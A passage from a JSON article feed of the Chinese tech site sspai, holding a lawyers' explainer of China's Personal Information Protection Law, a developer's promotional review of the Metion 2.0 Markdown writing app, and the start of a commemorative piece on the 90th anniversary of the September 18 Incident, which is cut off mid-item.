href=\"https://github.com/JaxsonWang/Ghost-Theme\" target=\"_blank\">JaxsonWang / Ghost-Theme</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68855"},{"title":"吹尽狂沙始到金——《个人信息保护法》有哪些亮点值得关注？","date":"2021-09-19 07:00:00","description":"\n<p><strong>编注：</strong>本文原文由北京市中伦律师事务所李瑞律师、贾申律师、钟俊鹏律师、李梦涵律师撰写，团队执业领域包括反垄断与竞争法、数据合规与网络安全、跨境投资并购等。少数派经授权在原文基础上修订并转载。</p>\n<hr>\n<h2>引言</h2>\n<p>2021 年 8 月 20 日，第十三届全国人大常委会第三十次会议第三次审议通过了<a href=\"http://www.npc.gov.cn/npc/c30834/202108/a8c4e3672c74491a80b53a172bb753fe.shtml\" target=\"_blank\">《中华人民共和国个人信息保护法》</a>（「个保法」），将于 2021 年 11 月 1 日起施行。</p>\n<p>个保法是我国信息安全领域一项重要法律，也是我国首部针对个人信息保护的专门法；其与宪法、民法典中的原则性规定相衔接，既反映了时代趋势和国际实践，也考虑了我国的实际情况和需要。</p>\n<p>因此，自去年 10 月个保法草案（「一审稿」）公开征求意见起，就引起了包括互联网平台在内的社会各界的高度关注，其中较为严格的处罚标准还引发了热烈讨论。</p>\n<p>今年 4 月，在吸收各方意见的基础上，个保法草案二次审议稿（「二审稿」）公布并提请人大常委会审议。8 月通过的正式文本又在二审稿基础上做了细微但值得关注的修订。</p>\n<p>可见，个保法从草案亮相到最终通过，历经三次审议、耗时近一年，而前期筹备和调研花费的时间还要更长，可谓「千淘万漉虽辛苦，吹尽狂沙始到金」。</p>\n<p>正式通过的个保法共八章、七十四条，以个人信息保护为核心，通过设定个人信息处理者（「处理者」）的保护责任、信息处理规则和行为边界，形成了逻辑紧密的规范体系，也可称为有史以来个人信息保护领域最全、最准、最严的专门法律。</p>\n<p>那么，从个人用户角度，个保法究竟明确或赋予了我们哪些权利，对于掌握着个人信息的互联网公司又提出了哪些具体要求？本文将为你一一解读。</p>\n<h2>点头不是一面之交，时时事事向你汇报</h2>\n<p>个人信息处理并不是一次性的事件。正如个保法明确规定，「处理」包括收集、存储、使用、加工、传输、提供、公开、删除等（第 4 条），即覆盖了个人信息处理的<strong>全生命周期</strong>。相应地，「知情—同意」的个人信息处理原则也贯穿于这些环节。</p>\n<p>具体而言：</p>\n<p>在处理个人信息<strong>之前</strong>，处理者应当显著地、清晰易懂地向个人告知相关事项，并在个人充分知情的前提下取得其自愿、明确作出的同意。</p>\n<p>而在个人信息<strong>后续处理</strong>的各环节，个保法针对不同情形有针对性地建立了下列同意机制：</p>\n<ul>\n<li>\n<strong>单独同意机制</strong>：处理者向他人提供其处理的个人信息、公开其处理的个人信息以及处理生物识别、医疗健康、金融账户、行踪轨迹等敏感个人信息的，应当取得个人的单独同意。</li>\n<li>\n<strong>重新同意机制</strong>：个人信息的处理目的、处理方式和处理的个人信息种类发生变更的，应当重新取得个人同意。当处理者因合并、分立、解散、被宣告破产等原因而转移个人信息，或向他人提供其处理的个人信息时前述事项发生变更的，也应重新取得个人同意。</li>\n<li>\n<strong>撤回同意机制</strong>：基于个人同意而进行的个人信息处理活动，个人有权撤回其同意。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/bbf8781387160a1a22e3063b152a45b3\"></figure><p>可是，如果遇到「耍无赖」的 app，不点击同意就无法使用怎么办呢？为了约束这种非必要的、捆绑性的信息获取行为，个保法明确规定「个人信息处理者不得以个人不同意处理其个人信息或者撤回其对个人信息处理的同意为由，拒绝提供产品或者服务」，仅「处理个人信息属于提供产品或者服务所必需的除外」（第 16 条）。</p>\n<p>另一方面，为了给相关企业合法进行个人信息处理留下一定空间，个保法在知情同意作为基本原则的基础上，还明确了<strong>无需个人同意的例外情形</strong>，主要集中于个保法第 13 条（见下图）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/b351ef5c87562d4a72f4999d79988891\"></figure><p>其中值得特别关注的包括：</p>\n<p>将人力资源管理纳入可处理范围：相比二审稿，正式稿新增了一项例外情形——「按照依法制定的<strong>劳动规章制度</strong>和依法签订的集体合同实施<strong>人力资源管理所必需</strong>」的，处理个人信息无需同意。</p>\n<p>个保法明确了处理者可以无需同意，在合理范围内处理<strong>已公开的个人信息</strong>（但个人明确拒绝的除外）。</p>\n<h2>可改、可删、可携带，从头到尾听你的</h2>\n<p>原则层面，个保法开篇即明确了个人信息处理的「三最」体系——处理个人信息应当采取对个人权益影响<strong>最小的方式</strong>、收集范围应当限于实现处理目的的<strong>最小的范围</strong>、保存期限应当为实现处理目的所必要的<strong>最短的时间</strong>。</p>\n<p>在此之外，个保法专章规定了「个人在个人信息处理活动中的权利」，梳理了个人信息权利的多个方面，包括个人信息收集、维护和获取三个阶段中的各项权利，具体如下图所示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/ed8f2918353c3df0cc697a9b6177d77f\"></figure><p>其中，一些值得特别关注的亮点包括：</p>\n<p><strong>承继行使权：</strong>已故用户的信息如何处置，是国内外网络平台近年来普遍遇到的难题之一。对此，个保法在二审稿阶段即创设性地设置了死者个人信息权利承继行使权，当时的表述为「自然人死亡的，其在个人信息处理活动中的权利由其近亲属行使」。但考虑到如此规定过于粗略，可能难以实施，最终稿立足便利司法的导向，从行权目的、权利内容以及尊重死者意志三个角度，对该规则进行了修正，体现了衡平的立法思维。</p>\n<p><strong>个人信息可携带权：</strong>在个人信息保护的实践中，往往会遇到各 app 之间数据不互通、数据无法转移的困境。个人虽然享有对其个人信息的权利，但无法因个人意志而将信息「携带」至另一个 app。</p>\n<p>对此，个保法第45条规定：「个人请求将个人信息转移至其指定的个人信息处理者，符合国家网信部门规定条件的，个人信息处理者应当提供转移的途径。」这是旨在规制数据领域的垄断行为、打破数据资源的封闭性，避免「数据孤岛」。</p>\n<p>不过，上述规定并未说明个人行使可携带权时，处理者提供的数据应当达到什么标准。对此，或许可以参考欧盟《通用数据保护规定》（GDPR）的相关规定：</p>\n<blockquote><p>数据主体有权获取其提供给数据控制者的相关个人数据，其所获取的个人数据形态应当是<strong>结构化</strong>的（structured）、<strong>通用</strong>的（commonly used）和<strong>机器可读</strong>的（machine-readable），且数据主体有权将此类数据<strong>无障碍</strong>地从该控制者处传输至其他控制者处。</p></blockquote>\n<h2>用我的数据给我下套？别高兴得太早</h2>\n<p>如今，各种算法和人工智能技术在互联网服务和 app 中的应用越来越广泛，如采集用户个人身份信息和消费信息并利用大数据进行用户画像，再结合算法技术，向用户定向、定点、定时地投放商业广告或为用户自动指向推荐选项。</p>\n<p>这种利用个人信息进行用户画像、算法推荐等<strong>自动化决策</strong>行为带来了不少问题，包括过度收集个人信息、「大数据杀熟」等，也对消费者个人选择权以及个人信息权利人的信息安全构成了较大冲击。</p>\n<p>为此，个保法设立了专门的自动化决策信息处理规则。其中，「自动化决策」是指利用个人信息对个人的行为习惯、兴趣爱好或者经济、健康、信用状况等，通过计算机程序自动分析、评估并进行决策的活动，包括用户画像、算法推荐等具体情形。</p>\n<p>如果互联网公司构成个保法定义的「自动化决策」行为，根据个保法要求，需要遵循下图所示基本原则和具体要求：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/503f44c9f883ffb5e58c7baa2b0cb9cf\"></figure><p>不仅如此，个保法对自动化决策的相关规定，也与现行或将出台的法律法规和配套指南相呼应，形成协同执法的强力监管体系：</p>\n<ul>\n<li>\n<strong>反不正当竞争角度：</strong>近期发布的《禁止网络不正当竞争行为规定（公开征求意见稿）》规定不得利用数据、算法等技术手段开展不正当竞争行为。</li>\n<li>\n<strong>反垄断角度：</strong>《关于平台经济领域的反垄断指南》禁止利用技术手段、平台规则、数据和算法等方式排除限制竞争，明确规定不得「利用数据、算法、平台规则等实现协调一致行为」，或「利用数据和算法对价格进行直接或者间接限定」，「利用技术手段、平台规则、数据和算法等方式限定其他交易条件，排除、限制市场竞争」，或「在平台规则、算法、技术、流量分配等方面设置不合理的限制和障碍，使交易相对人难以开展交易」。</li>\n</ul>\n<h2>敏感信息，值得多几道关卡</h2>\n<p>各类个人信息的重要程度并不是完全相同的；一些敏感信息被泄漏或滥用造成的损害会更严重，因此理应受到更高程度的保护。</p>\n<p>对此，个保法首先通过「概括式 + 列举式相结合」的方式，对敏感个人信息进行了更为明确的界定，将其定义为：</p>\n<ul>\n<li>（概括）一旦泄露或者非法使用，容易导致自然人的人格尊严受到侵害或者人身、财产安全受到危害的个人信息。</li>\n<li>（列举）包括生物识别、宗教信仰、特定身份、医疗健康、金融账户、行踪轨迹等信息，以及不满十四周岁未成年人的个人信息。</li>\n</ul>\n<p>对于敏感个人信息，处理者必须遵守的义务：</p>\n<ul>\n<li>\n<strong>基本原则上：</strong>只有在具有<strong>特定</strong>目的和<strong>充分</strong>必要性，并采取<strong>严格保护措施</strong>的情形下，方可处理敏感个人信息。</li>\n<li>\n<strong>在「知情—同意」机制上：</strong>除了告知处理一般个人信息时应告知的事项，处理者还必须：<ul>\n<li>特别告知处理敏感个人信息的<strong>必要性</strong>以及<strong>对个人的影响</strong>；</li>\n<li>就处理敏感个人信息取得个人的<strong>单独同意</strong>。</li>\n</ul>\n</li>\n</ul>\n<p>敏感个人信息的保护是个保法起草中的关注重点。二审稿阶段，对敏感个人信息的保护还比较薄弱，仅要求取得个人的单独同意并进行获取敏感个人信息必要性的告知。最终稿在二审稿的基础上，为处理敏感个人信息新增了「特定目的和充分必要性」以及「采取严格保护措施」的两大前提，显著地增大了保护力度。</p>\n<p>此外，个保法将<strong>不满十四周岁未成年人的个人信息</strong>明确列为敏感个人信息，厘清了这两类特殊个人信息之间的逻辑关系，并要求应当制定专门的个人信息处理规则。这体现了个保法对于未成年人个人信息保护的特别关怀以及立法技术在协调性上的进步。</p>\n<h2>个人信息出境，也须「通关文牒」</h2>\n<p>随着互联网的发展、中外信息和商业交流的日益加深，个人信息的跨境问题也成为关注重点。</p>\n<p>对此，个保法专章规定了「个人信息跨境提供的规则」，对个人信息跨境流通的合法性依据和相关审查机制进行了体系性的建构，既体现了对所有个人信息跨境情形的通用要求，也涵盖了涉及一些特殊处理者、接收方时的特殊要求。如下图所示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/3299f39cc1abe335dd126d7b496d1a47\"></figure><p>这里，一个亮点是<strong>「个人信息跨境提供标准合同」</strong>机制的设立。</p>\n<p>一审稿阶段，个保法仅要求双方签订合同，但没有对该合同的起草方、合同的具体条款进行详细规定，因此双方可自行设计个性化的商业安排；这可能为双方绕过法定义务提供空间。</p>\n<p>到了正式稿中，则明确要求应当「按照国家网信部门制定的标准合同与境外接收方订立合同」，从而设立了个人信息跨境提供标准合同机制，体现了对信息跨境传输的从严监管趋势。</p>\n<h2>平台有担当，用户有保障</h2>\n<p>随着全球数字服务的蓬勃以及数字市场规则的发展，互联网平台日渐成为一种具有特殊地位的数据处理者；一些境外立法实践关注到了这一趋势，对大型互联网平台采取特殊规定。</p>\n<p>例如，欧盟《数字服务法》就对数字服务平台要求高透明度并设置了严格的问责机制，用户达到4500万或以上的「超大型平台」必须履行风险管理义务、外部风险审计和公共问责等更严格法律义务。</p>\n<p>类似地，个保法针对「重要互联网平台」这一特殊的处理者类型创设了特殊义务，通过三大主体特征划定适用范围，建构四大特殊义务设定合规框架，在此法律框架下，预计重要网络平台个人信息保护将面临新一波执法浪潮。具体的界定标准和特殊义务如下图所示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/e1cb93669834de7890d2f9ac41c8ad73\"></figure><p>值得注意的是，个保法第 62 条明确由国家网信部门针对<strong>小型处理者</strong>制定专门个人信息保护规则、标准的规定，留出了立法空间。因此，下一步国家网信部门可能在降低要求、责任豁免等方面对中小平台制定专门规则，从而增加相关规则的灵活性和可实施性。</p>\n<h2>重典治乱象，追责清沉疴</h2>\n<p>对于违法处理个人信息或处理个人信息未履行相关保护义务的行为，个保法明确了惩处措施、强化了惩处力度，包括：</p>\n<ul>\n<li>对<strong>违法处理个人信息的应用程序：</strong>可责令暂停或者终止提供服务；</li>\n<li>对<strong>情节严重的违法行为</strong>：由省级以上主管部门责令改正，没收违法所得，并处 <strong>5000 万元</strong>以下或者<strong>上一年度营业额 5% </strong>以下罚款，并可以：<ul>\n<li>责令企业暂停业务或停业整顿、吊销业务许可或营业执照；</li>\n<li>对直接负责人员处以 10 万元以上 100 万元以下罚款，禁止其在一定期限内担任相关企业的董事、监事、高管和个人信息保护负责人等。</li>\n</ul>\n</li>\n</ul>\n<p>相对于二审稿，正式稿新增了对高管的禁业处罚，通过强化惩处力度倒逼企业相关人员履行个人信息保护的责任。</p>\n<h2>小结</h2>\n<p>个保法贯彻了保护个人信息权益、规范个人信息处理活动、促进个人信息合理利用三大立法目标，呈现出不少兼具理论高度和现实关怀的立法亮点。我们相信这部法律的颁行，对于用户和行业都将产生深远的影响。</p>\n<p>不过，除了个保法本身的规定外，这部法律与我国近来其他信息安全相关法律——《网络安全法》《数据安全法》等——分别侧重于哪些方面，与国外类似的个人信息保护法规又有哪些异同，也都是值得探索的话题。对此，我们将在后续文章中陆续加以分析介绍，敬请关注。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68832"},{"title":"送码 | 双向链接、微信记录…… 让「桌面级」iPad 写作体验更进一步：Metion 2.0","date":"2021-09-19 03:00:00","description":"\n<p>Metion 是一款支持 iOS、iPadOS、macOS 的 Markdown 写作工具，除了为中文写作场景进行优化，也致力为 iPad 带来了桌面级写作体验。近期，Metion 推出了 2.0 大版本更新，让这款写作工具在多平台上的写作体验进一步统一和完善，不妨一起看看全新的 Metion 有哪些变化。</p>\n<p>对了，Metion 2.0 也为少数派用户准备了一个小彩蛋，不要错过。</p>\n<h2>iPhone、iPad 和 Mac：一致的写作体验</h2>\n<p>Metion 始于 iOS 版，后想借助 Mac Catalyst、M1 芯片， 快速实现 macOS 版，尝试了，不甚理想。</p>\n<p>决定从零开始重写 Mac 版，经过长时的努力后，默默发布了 Metion 1.9 原生 macOS 版，Metion 2.0 也继续迭代着，现在基本上能跟 iOS 看齐了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/Metion/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2021-09-11/bbdcdc07ea1ef0ddebc59741e3e09a05.jpeg\" alt=\"同样的内容，不同设备的呈现\"><figcaption>同样的内容，不同设备的呈现</figcaption></figure><p>写作体验，是 Metion 最在乎的。Metion 2.0 有了巨大的变化，依然坚持写作体验优先。</p>\n<p>iPad、Mac、iPhone 上，不论屏幕的大小，Metion 的功能都想办法保持了一致性。</p>\n<p>而在 iPadOS 上，Metion 投入了更多的精力进行优化，尤其是 iPad Pro。虽然加上键盘的 iPad Pro 重量有点令人诟病，但 iPad 在另一方面，也是被很多朋友忽略掉的却又是非常棒的写作工具台。</p>\n<p>Metion 2.0，特别对于 iPad 而言，无疑会赋予它更强的可能性。</p>\n<h2>「连接真实世界」的知识库</h2>\n<p>即将于 9 月 21 日发布的 iOS / iPadOS 15 有一个新的特性，照相机可以实时识别文本。Metion 2.0 也新增加了一系列<strong>知识库</strong>相关的功能，我们想把这两者结合在一起，那么 Metion 上的笔记就能活用起来了。</p>\n<p>或许未来再配合 AI 不断迭代，拿着 Metion 扫描纸上的一个问题，它能提炼出一些直接的答案来，但现在还只能做到基于文本的信息匹配。不过已经很有趣了，某些场合下，也相当实用。</p>\n<p>「来自相机的文本」在 iPad OS 15 上并没有实际的支持，可以使用 iPhone 扫描文本后，Metion 会自动把内容复制到粘贴板，借助「通用剪贴板」功能， 再在 iPad 上打开就可以了。</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/Metion/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2021-09-10/text-from-camera-output.gif\" alt=\"实际的匹配度也取决于知识库本身的内容和组织方式\"><figcaption>实际的匹配度也取决于知识库本身的内容和组织方式</figcaption></figure><h2>知识库、图谱、双向链接，该有的都有</h2>\n<p><strong>双向链接</strong>是知识库的基本功能，但也不算新的概念，有时甚至也不是必需的一环。下面是 Metion 知识库产生的一些图谱，节点产生的关系来自于 Tag、文档路径，没有双向链接。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/Metion/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2021-09-10/sspai-networkgif.gif\" alt=\"文档位于不同文件夹而拥有了不同颜色\"><figcaption>文档位于不同文件夹而拥有了不同颜色</figcaption></figure><p>Metion 也同样支持双链，困扰我们的并非技术性的概念，而是「<strong>如何让一个知识库面向普通人都是友好的</strong>」。如果不解决这个问题，一些普通用户在实践知识管理的过程中，会自然产生一些比如「看起来挺酷但没什么用」的想法。 </p>\n<p><strong>实用性</strong>是 Metion 2.0 知识库追求的根本原则，目前已有了一些成果，但未来进步的空间也很大，还需要不断揉合「简单与复杂的矛盾性」。</p>\n<p>Metion 的<strong>网状结构</strong>内嵌入了<strong>树状结构 </strong>(树状图谱是 Metion 非常侧重的一环，有时它更实用)，两者配合时，一个宏观、一个微观。另外，在 iPad 的<strong>分屏</strong>上还能相互联动，启用 Metion 的<strong>阅读模式 </strong>(快捷键为 Shift + Command + R)，在建议设置面板的「Markdown 与预览」中勾选「显示被引用链接」即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/Metion/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2021-09-10/graph+read.gif\" alt=\"iPad 上分屏时树状、网状图谱与阅读模式的联动\"><figcaption>iPad 上分屏时树状、网状图谱与阅读模式的联动</figcaption></figure><p>Metion 也在形成自己的一些朴素原则，比如<strong>简单整理</strong>的原则：选中一段文字后，可以把这段文字移动到其它文章中，或者把选中文字中关联文档批量移动位置 (包括文章内的图片)。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/Metion/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2021-09-13/45b3f43faa06e319bf93da801c7161f6.jpeg\" alt=\"简单整理，是容易被忽略掉的一个原则\"><figcaption>简单整理，是容易被忽略掉的一个原则</figcaption></figure><h2>支持 Git 同步，带来更多可能</h2>\n<p>Metion 默认使用 iCloud Drive 进行跨设备的文档同步，在 Apple 的生态下，iCloud 是最自然的选择，但它总有不稳定的时候。</p>\n<p>一直想彻底解决稳定同步的问题，在 Metion 2.0 中，这个答案是 <strong>Git</strong>。</p>\n<p>iOS、iPadOS 上使用 Git 并不容易，不像 macOS。最终，Metion 直接内部集成了一个 Git 客户端，也对应了不少自动处理的策略，基本上一般的「合并冲突」能自动对应掉了。</p>\n<p>Metion 中 Git 性质的工作目录不参与 iCloud 的同步，使用 Git 需要新建一个全新的工作目录，且需要先有一个 Remote Repo (远程仓库)，国内使用的话，我们建议可以考虑比如 Gitee.com 之类的托管，速度够快。</p>\n<p>Metion 嵌入 Git 之后，诸多的可能性被激发了：</p>\n<ul>\n<li>接近无限的历史版本</li>\n<li>简单的多人协作写作</li>\n<li>通过 PR (pull request) 的方式接受投稿</li>\n<li>一个 Git 服务商提供的 Web 端可以直接编辑文章</li>\n<li>更强的跨操作系统能力，在 Linux、Windows 上配合其它桌面端的笔记工具使用</li>\n<li>以及更多……</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/Metion/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2021-09-10/metion-git-screen.png\" alt=\"Metion 也可以勾选自动同步而不用手工 Pull &amp; Push\"><figcaption>Metion 也可以勾选自动同步而不用手工 Pull &amp; Push</figcaption></figure><h2>所见即所得还是纯文本？其实并不矛盾</h2>\n<p>我们自己非常偏好<strong>纯文本倾向</strong>的风格，Metion 也有用户希望提供<strong>所见即所得</strong>的模式，每人都有自己欢喜的方式，我们很想有一个魔法开关，供用户自行选择。但这两种方式，基本上对应两种截然不同的技术方案 (一般 WYSIWYG 基于 webview 为主)，有天然的互斥性。持续完善其中一个，已不容易，如果新增另外一个方案从零开始，几乎不可能。</p>\n<p>在 Metion 2.0 中，我们造出了这个<strong>魔法开关</strong>。</p>\n<p>基于 Apple 底层的排版引擎优化，Meiton 2.0 可以开启「<strong>自动隐藏语法关键字符</strong>」，这是一种接近<strong>所见即所得</strong>的写作模式。它有个巨大的优势，是<strong>原生</strong>的，能提供足够可靠的性能支持，基本不影响 Metion 原来的排版引擎，交互上也比较自然。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/Metion/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2021-09-11/169346a2b74eab23a1b863da4e3d057a.jpeg\" alt=\"所见即所得和纯文本的对比\"><figcaption>所见即所得和纯文本的对比</figcaption></figure><p>由于涉及到排版引擎这种比较底层的逻辑，还有很多细节需要调整和对应。但这个魔法开关的存在，为 Metion 后续在 WYSIWYG 方面的迭代，提供了基石。</p>\n<h2>随时随地，用微信高效记录</h2>\n<p>灵感，不及时记录下来，就会彻底跑掉。通过语音输入的方式，或许能成为一种重要补充方式。</p>\n<p>Metion 2.0 提供了微信服务号的绑定支持，可以通过语音消息自动转文字，也支持图片，甚至一篇公众号的文章都可自动提取图文。</p>\n<p>就我们自己的实践来看，思路清晰时，通过语音<strong>每小时能产生将近万字</strong>的草稿，即使最后整理后删减了很多，但这个效率非常高，记录也变得更无压力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_6igq4sw3/Metion/%E5%B0%91%E6%95%B0%E6%B4%BE/_image/2021-09-11/metion+wechat.png\" alt=\"语音、文字、图片、公众号文章链接，皆可\"><figcaption>语音、文字、图片、公众号文章链接，皆可</figcaption></figure><p>溯及使用微信进行发布的特性，最早的 FarBox 就已经提供了，四舍五入差不多快十年了。这个功能需要<strong>服务器</strong>支持，Metion 2.0 在这个功能上最大的困难是「<strong>如何不碰用户的数据</strong>」，最后想的办法是在服务器做了一层中转的逻辑，当同步到 Metion 的客户端后，服务器上就会按约定自动删除数据。 </p>\n<p>Metion 的微信服务号，是<strong>特别小众的场景</strong>，本质上就是<strong>草稿、汇总、记录</strong>，但是，它不会结构化每一条的输入，也不会帮你回顾过往，毕竟在服务器上没有实质的数据存储……</p>\n<p>微信的 watchOS 端，会在对话列表中直接过滤掉服务号，只有偶然的机会才能触发它的 bug 而保留某个服务号一段时间，不然 Watch 上也能通过语音打草稿了。现在我自己的做法是，在表盘上留一个系统备忘录 App 的入口，然后 Metion 的 macOS 端和 iPadOS 端都已支持语音文件转成文本文字(基于 Apple 的系统 API)，只是准确率尚不佳。虽然也想完成 Metion 的 watchOS 端，但意识到客观局限所在，并不能最终增强 Metion 输入的能力，就先搁置着。</p>\n<p>虽只做了服务器的中转，复杂度和性能负担反而有所增加。另外，因为涉及到服务器和后续的维护成本，微信服务号的同步是另外定价的，轻度使用会显得性价比不高，不建议购买。但试用下也是无碍的，有 2 个礼拜的试用期，如不需要记得先取消订阅就可以了。另外，利用微信服务号进行同步的基础源代码是开放的，具体的源代码可参考 <a href=\"https://github.com/hepochen/FarBox/tree/master/farbox_bucket/clouds/wechat\">此处</a>。</p>\n<h2>一个小彩蛋</h2>\n<p>作为开发者，吃自己的狗粮是经常会出现的事情，比如上文提到的语音文件转文本的支持，就是一例。</p>\n<p>还有一个小彩蛋：<strong>Metion 支持直接发布文章到少数派</strong>，本篇文章就是在 Metion 上完成并直接发布的。</p>\n<p>虽然 Metion 不是免费的软件，但在试用状态的限制并不是非常严格，比如发布到少数派随发随删或者文章数量不超，比如通过 Metion 的 URL Scheme 传入内容并最终通过 Git 来 Push 到 remote，则永久都不会触发到试用的边界。工具毕竟只是工具而已，就我个人而言，特别欣赏这种重器轻用、活用的做法，如有需要还可另外提供支持。 :)</p>\n<h2>送码</h2>\n<p>最后，你对 Metion 有哪些看法和建议？你对于 iPad 写作工具有哪些需求？欢迎在评论区和我们讨论，10.1 前选 3 位读者送出 Metion 标准版兑换码，2 位读者送出标准版 + 一年扩展包订阅的兑换码。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/metion-%E4%B8%AD%E6%96%87%E5%86%99%E4%BD%9C%E8%80%85%E7%9A%84%E7%AC%94%E8%AE%B0%E5%B7%A5%E5%85%B7/id1530965242\" target=\"_blank\">App Store</a> 下载 Metion。</p>\n<span class=\"ss-application\" app-id=\"15818\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68722"},{"title":"「九一八」事变 90 周年纪念日恰逢 2021 年全民国防教育日，勿忘国耻，警钟长鸣，你有什么想说的？","date":"2021-09-18 11:19:53","description":"\n<p>1931年9月18日晚，南满铁路柳条湖段的一声巨响，翻开了中华民族14年艰苦卓绝的血泪史。七八百人的侵略者，仅几个小时就攻陷了近7000人驻守的东北军北大营，不到24小时，沈阳全城陷落。短短4个月之后，美丽富饶的东北全境沦陷，3000万同胞成为亡国奴。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e25a9f989b5a9ee696311fd9b078df85_720w.jpg?rss\" data-caption=\"日军蓄意制造柳条湖事件的现场\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"326\" data-watermark=\"original\" data-original-src=\"v2-e25a9f989b5a9ee696311fd9b078df85\" data-watermark-src=\"v2-67ee8289a5da26cd052fbd15802b329d\" data-private-watermark-src=\"v2-4611003fc84047b2e1c4b98e38c616ef\"></p>\n<p>自此，“九一八”三个字，成为永远烙印在中华儿女心头的一道伤痕，鲜红刺目。那一年的9月18日是中国农历八月初七，再过几天就是中秋节，无数人没能等来万家团圆的时刻，他们将要面对的是山河破碎，国土沦陷。</p>\n<p><b>入侵东北后的日军，所到之处烧杀抢掠，无恶不作。</b>沈阳最先被日军占领，这座历史悠久的古城转眼变成人间炼狱。日军把炮台置于沈阳城鼓楼的旧址之上，并且封锁了各交通路口，持械盘查行人，对稍有不满或有反抗行为的就任意枪杀，致使许多无辜百姓惨遭杀戮。城内硝烟弥漫，街头尸横遍野。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d115323a698b96e53052c6e40204781d_720w.jpg?rss\" data-caption=\"日军占领沈阳城\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"408\" data-watermark=\"original\" data-original-src=\"v2-d115323a698b96e53052c6e40204781d\" data-watermark-src=\"v2-cb79db9a006b8313b8ca0414cd507a3c\" data-private-watermark-src=\"v2-70510f25d038c15ea39502fe175fbf92\"></p>\n<p>此后，锦州沦陷，哈尔滨沦陷……日军继而占领辽宁、吉林、黑龙江3省，一路攻城略地，<b>铁蹄践踏下东北人民的命运大抵相同——受尽折磨与摧残。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0c99937d442c2ec80fea7bc5d9251f1a_720w.jpg?rss\" data-caption=\"日军占领吉林市\" data-size=\"normal\" data-rawwidth=\"589\" data-rawheight=\"397\" data-watermark=\"original\" data-original-src=\"v2-0c99937d442c2ec80fea7bc5d9251f1a\" data-watermark-src=\"v2-3e764c3ace0c81b34523008b5a1a6ca0\" data-private-watermark-src=\"v2-636c8480e2b1101068ddee66b51a337d\"></p>\n<p>日本一方面攻占东北，另一方面加紧扶持地方伪政权。1932年3月1日，日本扶植的满洲国正式成立。<b>亡国灭种的耻辱刻在东北大地上。</b>东北人民不仅失去了作为中国人的尊严，甚至连最起码的生存需求也无法满足，沦为伪满洲国的贱民。</p>\n<p>在城镇，许多民众的房屋、商铺、财产被日军征用、强占、掠夺。日本为了满足其战争需求，对东北为数不多的产业工人实行更加残酷的剥削和无情的压榨。在阜新煤矿，推行“人肉开采”政策，要煤不要人，这是日本人对待煤与人关系的一个“准则”。他们通过把头招骗、勤劳奉仕、抓捕战犯和平民百姓等手段，每年弄来几万人下井挖煤，只要多出煤，什么安全不安全、死人不死人全然不顾。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cd8739a330112fcd5c44dbeca5d7b0ef_720w.jpg?rss\" data-caption=\"日本侵略军装甲部队侵入沈阳市​\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"423\" data-watermark=\"original\" data-original-src=\"v2-cd8739a330112fcd5c44dbeca5d7b0ef\" data-watermark-src=\"v2-781746b68c20e95c6919c911aca864d3\" 